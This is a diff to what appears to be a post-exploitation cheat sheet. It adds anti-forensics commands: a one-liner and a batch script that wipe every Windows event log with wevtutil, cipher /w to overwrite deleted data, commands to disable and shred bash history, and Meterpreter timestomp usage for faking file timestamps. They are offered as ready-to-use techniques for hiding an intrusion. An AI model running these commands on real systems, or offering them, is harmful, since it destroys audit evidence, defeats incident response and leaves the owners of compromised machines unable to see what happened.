@@ -102,15 +102,70 @@ It uses the service [Named Pipe Impersonation (In Memory/Admin) Technique](https
 clearev
 ```
 
-### Leave no trace of MACE attributes when reading or modifying files using Meterpreter
+### Clear all event viewer logs using wevtutil (Windows)
 
-#### To view the mace attributes of a file
+```sh
+for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+```
+
+```sh
+@echo off
+
+FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
+IF (%adminTest%)==(Access) goto noAdmin
+for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
+echo.
+echo All Event Logs have been cleared!
+goto theEnd
+
+:do_clear
+echo clearing %1
+wevtutil.exe cl %1
+goto :eof
+
+:noAdmin
+echo Current user permissions to execute this .BAT file are inadequate.
+echo This .BAT file must be run with administrative privileges.
+echo Exit now, right click on this .BAT file, and select "Run as administrator".  
+pause >nul
+
+:theEnd
+Exit
+```
+
+### Securely delete a chunk of data by overwriting it to prevent its possible recovery using in-built Windows tool (Windows)
+
+```sh
+cipher /w:[Drive or Folder or File Location] 
+```
+
+### Avoid bash history
+
+#### Disable the BASH shell from saving the history (Linux)
+
+```sh
+export HISTSIZE=0
+```
+
+#### Make bash history unreadable (Linux)
+
+```sh
+shred ~/.bash_history
+```
+
+```sh
+shred ~/.bash_history && cat /dev/null > .bash_history
+```
+
+#### Leave no trace of MACE attributes when reading or modifying files using Meterpreter
+
+#### To view the mace attributes of a file (Windows)
 
 ```sh
 timestomp [FILE] -v
 ```
 
-#### Change MACE attributes
+#### Change MACE attributes (Windows)
 
 ```sh
 timestomp [FILE] -m "mm/dd/yyyy hh:mm:ss"
